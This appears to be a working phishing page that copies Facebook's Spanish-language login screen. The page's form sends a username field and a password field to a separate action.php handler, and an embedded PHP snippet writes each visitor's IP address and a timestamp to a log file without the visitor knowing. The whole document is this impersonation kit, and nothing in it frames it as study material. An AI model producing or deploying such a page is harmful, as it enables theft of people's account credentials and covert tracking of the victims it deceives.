<!DOCTYPE html><html lang="en" id="facebook" class="canHaveFixedElements" style=""><head>
<html>
<head>
<title>Iniciar sesi&oacute;n en Facebook | Facebook</title>
<link rel="icon" href="images/fb-ico.ico" />
<style>
body {
background-color: #EDF0F5;
}
@font-face {
   font-family: myFirstFont;
   src: url(roboto.ttf);
}

* {
   font-family: myFirstFont;
}
.head {
    list-style-type: none;
    margin: 0;
    padding: 0;
    overflow: hidden;
    background-color: #3B5998;
    position: fixed;
    height: 83px;
    width: 100%;
    top: 0px;
    left: 0px
    
}

li {
    float: left;
}

li a {
    display: block;
    color: white;
    text-align: center;
    padding: 14px 16px;
    text-decoration: none;
}
.login-btn {
    background-color: #4267B2;
    border: none;
    color: white;
    padding: 15px 32px;
    text-align: center;
    text-decoration: none;
    display: inline-block;
    font-size: 16px;
    margin: 4px 2px;
    cursor: pointer;
	width: 75%;
}
.box {
    background-color: #ffff;
	height: 270px;
    width: 500px;
    padding: 25px;
    margin: 25px;
    position: fixed;
    top: 150px;
    left: 324px
}
input[type=text] {
    width: 75%;
    padding: 12px 20px;
    margin: 8px 0;
    box-sizing: border-box;
}
a {
    text-decoration: none !important;
}
p {
font-size: 20px;
}
.footer {
   position: fixed;
   left: 0;
   bottom: 0;
   width: 100%;
   background-color: white;
   text-align: left;
   height: 39%;
}
h6 {
	top: 50%;
}
.f {
    background-color: white;
    width: 300px;
    padding: 25px;
    margin: 25px;
	width: 75%;
	height: 110px;
	position: fixed;
	top: 71%;
	left: 130px;
}
input[type="password"] {
    font-family: caption;
    width: 75%;
    padding: 12px 20px;
    margin: 8px 0;
    box-sizing: border-box;
}
</style>
</head>
<body>

<div class="head">
  <li><a class="active" href="#home">&nbsp;</a></li>
  <li><a class="active" href="#home">&nbsp;</a></li>
  <li><a class="active" href="#home">&nbsp;</a></li>
  <li><a class="active" href="#home">&nbsp;</a></li>
  
<a href="#index">
<img border="0" src="images/facebook.png" width="205px" height="88px">></img>

</div>

<div class="box">
<p align="middle">Inicia sesi&oacute;n en Facebook</p>
<ul align="middle">
<form action="action.php" method="POST">
<input name="field1" type="text"/>
<input name="field2" type="password"/>
<input type="submit" name="submit" class="login-btn" value="Iniciar sesi&oacute;n"></input>
</form>
<a href="#forgot">Olvidaste tu cuenta? &#183; Crear una cuenta nueva</p>
</ul>
<?php
$line = date('Y-m-d H:i:s') . " - $_SERVER[REMOTE_ADDR]";
file_put_contents('log.log', $line . PHP_EOL, FILE_APPEND);
?>
</body>
</html>
